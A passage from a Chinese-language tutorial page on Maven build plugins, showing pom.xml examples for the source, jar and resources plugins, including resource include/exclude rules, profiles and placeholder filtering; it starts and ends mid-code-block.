<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>build</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>上面这段配置就是<strong>对源码进行打包的插件</strong>，我们运行<code>source:jar-no-fork</code>，那么在项目的目录底下的<code>target</code>会生成一个类似于<code>user-core-0.0.1-SNAPSHOT-sources.jar</code>这样的文件，即项目的源文件。</p>
<p>那么如何将这个插件与特定的生命周期绑定呢？我们来看下面这段配置：</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>build</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugins</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugin</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.apache.maven.plugins<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>maven-source-plugin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>3.2.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
            <span class="token comment">&lt;!-- 绑定source插件到Maven的生命周期,并在生命周期后执行绑定的source的goal --&gt;</span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>executions</span><span class="token punctuation">&gt;</span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>execution</span><span class="token punctuation">&gt;</span></span>
                    <span class="token comment">&lt;!-- 绑定source插件到Maven的生命周期 --&gt;</span>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>phase</span><span class="token punctuation">&gt;</span></span>compile<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>phase</span><span class="token punctuation">&gt;</span></span>
                    <span class="token comment">&lt;!--在生命周期后执行绑定的source插件的goals --&gt;</span>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>goals</span><span class="token punctuation">&gt;</span></span>
                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>goal</span><span class="token punctuation">&gt;</span></span>jar-no-fork<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>goal</span><span class="token punctuation">&gt;</span></span>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>goals</span><span class="token punctuation">&gt;</span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>execution</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>executions</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>plugin</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>plugins</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>build</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>通过这段配置，大家可以用<code>mvn package</code>将项目打包的同时会将源代码进行打包。（生成一个可执行jar包和一个sources.jar）</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20230309172623361.png" alt="image-20230309172623361"></p>
<p>executions 底下的每个 execution代表着一项执行任务，phase 用于指定绑定到生命周期的哪个阶段，goal用于指明执行插件目标</p>
<h2 id="span-id-maven-jar-plugin-maven-jar-plugin-span"><span id="maven-jar-plugin">maven-jar-plugin</span></h2>
<blockquote>
<p>建立可执行JAR</p>
</blockquote>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>build</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugins</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugin</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.apache.maven.plugins<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>maven-jar-plugin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>3.3.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>configuration</span><span class="token punctuation">&gt;</span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>archive</span><span class="token punctuation">&gt;</span></span>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>manifest</span><span class="token punctuation">&gt;</span></span>
                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>addClasspath</span><span class="token punctuation">&gt;</span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>addClasspath</span><span class="token punctuation">&gt;</span></span>
                        <span class="token comment">&lt;!-- main函数所在的类 --&gt;</span>
                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mainClass</span><span class="token punctuation">&gt;</span></span>org.local.Main<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mainClass</span><span class="token punctuation">&gt;</span></span>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>manifest</span><span class="token punctuation">&gt;</span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>archive</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>configuration</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>plugin</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>plugins</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>build</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="maven-resources-plugin">maven-resources-plugin</h2>
<p>参考：<a href="https://www.cnblogs.com/LQBlog/p/14775703.html">https://www.cnblogs.com/LQBlog/p/14775703.html</a></p>
<h3 id="修改默认读取资源地址">修改默认读取资源地址</h3>
<blockquote>
<p>能够将Maven项目中的各种资源文件复制到指定的输出目录中</p>
</blockquote>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>project</span> <span class="token attr-name">...</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>build</span><span class="token punctuation">&gt;</span></span>
     	  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>resources</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>resource</span><span class="token punctuation">&gt;</span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>directory</span><span class="token punctuation">&gt;</span></span>src/main/java<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>directory</span><span class="token punctuation">&gt;</span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>includes</span><span class="token punctuation">&gt;</span></span>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>include</span><span class="token punctuation">&gt;</span></span>**/*.xml<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>include</span><span class="token punctuation">&gt;</span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>includes</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>resource</span><span class="token punctuation">&gt;</span></span>
          	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>resource</span><span class="token punctuation">&gt;</span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>directory</span><span class="token punctuation">&gt;</span></span>src/main/webapp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>directory</span><span class="token punctuation">&gt;</span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>targetPath</span><span class="token punctuation">&gt;</span></span>META-INF/resources<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>targetPath</span><span class="token punctuation">&gt;</span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>includes</span><span class="token punctuation">&gt;</span></span>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>include</span><span class="token punctuation">&gt;</span></span>**/**<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>include</span><span class="token punctuation">&gt;</span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>includes</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>resource</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>resource</span><span class="token punctuation">&gt;</span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>directory</span><span class="token punctuation">&gt;</span></span>src/main/resources<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>directory</span><span class="token punctuation">&gt;</span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>includes</span><span class="token punctuation">&gt;</span></span>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>include</span><span class="token punctuation">&gt;</span></span>**/**<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>include</span><span class="token punctuation">&gt;</span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>includes</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>resource</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>resources</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>build</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>project</span><span class="token punctuation">&gt;</span></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="打包排除和包含文件">打包排除和包含文件</h3>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>build</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>resources</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>resource</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>directory</span><span class="token punctuation">&gt;</span></span>src/main/resources<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>directory</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>includes</span><span class="token punctuation">&gt;</span></span>
              <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>include</span><span class="token punctuation">&gt;</span></span>**/*.txt<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>include</span><span class="token punctuation">&gt;</span></span>
              <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>include</span><span class="token punctuation">&gt;</span></span>**/*.rtf<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>include</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>includes</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>excludes</span><span class="token punctuation">&gt;</span></span>
              <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>exclude</span><span class="token punctuation">&gt;</span></span>**/*.bmp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>exclude</span><span class="token punctuation">&gt;</span></span>
              <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>exclude</span><span class="token punctuation">&gt;</span></span>**/*.jpg<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>exclude</span><span class="token punctuation">&gt;</span></span>
              <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>exclude</span><span class="token punctuation">&gt;</span></span>**/*.jpeg<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>exclude</span><span class="token punctuation">&gt;</span></span>
              <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>exclude</span><span class="token punctuation">&gt;</span></span>**/*.gif<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>exclude</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>excludes</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>resource</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>resources</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>build</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="改变输出目录">改变输出目录</h3>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>resource</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>directory</span><span class="token punctuation">&gt;</span></span>src/main/resources<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>directory</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>targetPath</span><span class="token punctuation">&gt;</span></span>abc<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>targetPath</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>resource</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>如: <img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/779774-20210616144715540-1984363604.png" alt="img">  打包后  <img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/779774-20210616144726492-284896033.png" alt="img"></p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token comment">&lt;!-- 生产环境指定profile为acm,接入阿里云应用配置服务 --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>profiles</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>profile</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">&gt;</span></span>acm<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependencies</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.springframework.cloud<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-cloud-starter-alibaba-nacos-config<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>0.2.1.RELEASE<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependencies</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>build</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>resources</span><span class="token punctuation">&gt;</span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>resource</span><span class="token punctuation">&gt;</span></span>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>directory</span><span class="token punctuation">&gt;</span></span>src/main/resources/canal/pro/<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>directory</span><span class="token punctuation">&gt;</span></span>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>targetPath</span><span class="token punctuation">&gt;</span></span>canal<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>targetPath</span><span class="token punctuation">&gt;</span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>resource</span><span class="token punctuation">&gt;</span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>resource</span><span class="token punctuation">&gt;</span></span>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>directory</span><span class="token punctuation">&gt;</span></span>src/main/resources<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>directory</span><span class="token punctuation">&gt;</span></span>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>excludes</span><span class="token punctuation">&gt;</span></span>
                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>exclude</span><span class="token punctuation">&gt;</span></span>canal/pro/*.yml<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>exclude</span><span class="token punctuation">&gt;</span></span>
                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>exclude</span><span class="token punctuation">&gt;</span></span>canal/test/*.yml<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>exclude</span><span class="token punctuation">&gt;</span></span>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>excludes</span><span class="token punctuation">&gt;</span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>resource</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>resources</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>build</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>profile</span><span class="token punctuation">&gt;</span></span>
  
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>profile</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">&gt;</span></span>test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>activation</span><span class="token punctuation">&gt;</span></span>
            <span class="token comment">&lt;!--没有指定变量默认激活--&gt;</span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>activeByDefault</span><span class="token punctuation">&gt;</span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>activeByDefault</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>activation</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>build</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>resources</span><span class="token punctuation">&gt;</span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>resource</span><span class="token punctuation">&gt;</span></span>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>directory</span><span class="token punctuation">&gt;</span></span>src/main/resources/canal/test/<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>directory</span><span class="token punctuation">&gt;</span></span>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>targetPath</span><span class="token punctuation">&gt;</span></span>canal<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>targetPath</span><span class="token punctuation">&gt;</span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>resource</span><span class="token punctuation">&gt;</span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>resource</span><span class="token punctuation">&gt;</span></span>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>directory</span><span class="token punctuation">&gt;</span></span>src/main/resources<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>directory</span><span class="token punctuation">&gt;</span></span>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>excludes</span><span class="token punctuation">&gt;</span></span>
                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>exclude</span><span class="token punctuation">&gt;</span></span>canal/test/*.yml<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>exclude</span><span class="token punctuation">&gt;</span></span>
                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>exclude</span><span class="token punctuation">&gt;</span></span>canal/pro/*.yml<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>exclude</span><span class="token punctuation">&gt;</span></span>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>excludes</span><span class="token punctuation">&gt;</span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>resource</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>resources</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>build</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>profile</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>profiles</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="占位符替换">占位符替换</h3>
<ol>
<li>
<p>properties中定义，变量值</p>
<p>src/main/resources 下的yml配置文件 打包后则会默认填充</p>
<pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">spring</span><span class="token punctuation">:</span>
  <span class="token key atrule">profiles</span><span class="token punctuation">:</span>
    <span class="token key atrule">active</span><span class="token punctuation">:</span> $<span class="token punctuation">{</span>spring.profiles.active<span class="token punctuation">}</span>
    <span class="token key atrule">custom</span><span class="token punctuation">:</span> $<span class="token punctuation">{</span>custom<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token comment">&lt;!--定义占位符内容--&gt;</span>    
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>properties</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>java.version</span><span class="token punctuation">&gt;</span></span>1.8<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>java.version</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>custom</span><span class="token punctuation">&gt;</span></span>version<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>custom</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>spring.profiles.active</span><span class="token punctuation">&gt;</span></span>pro<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>spring.profiles.active</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>properties</span><span class="token punctuation">&gt;</span></span>
<span class="token comment">&lt;!--也可以定义在profile里面 如果写在profile就是针对profile的build--&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>build</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>resources</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>resource</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>directory</span><span class="token punctuation">&gt;</span></span>src/main/resources<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>directory</span><span class="token punctuation">&gt;</span></span>
          	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>includes</span><span class="token punctuation">&gt;</span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>include</span><span class="token punctuation">&gt;</span></span>*.yml<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>include</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>includes</span><span class="token punctuation">&gt;</span></span>
            <span class="token comment">&lt;!-- 允许替换占位符内容（默认false），占位符默认是 ${变量名称} 这样的形式--&gt;</span>
            <span class="token comment">&lt;!-- http://maven.apache.org/plugins/maven-resources-plugin/examples/filter.html --&gt;</span> 
            <span class="token comment">&lt;!-- maven会自动读取includes配置文件，然后解析其中的占位符，使用上面pom文件中定义的属性进行替换 --&gt;</span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filtering</span><span class="token punctuation">&gt;</span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filtering</span><span class="token punctuation">&gt;</span></span>
            <span class="token comment">&lt;!--可用于排除某些--&gt;</span>
<span class="token comment">&lt;!--                &lt;excludes&gt;--&gt;</span>
<span class="token comment">&lt;!--                    &lt;exclude&gt;file&lt;/exclude&gt;--&gt;</span>
<span class="token comment">&lt;!--                &lt;/excludes&gt;--&gt;</span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>resource</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>resources</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugins</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugin</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-boot-maven-plugin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>plugin</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugin</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.apache.maven.plugins<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
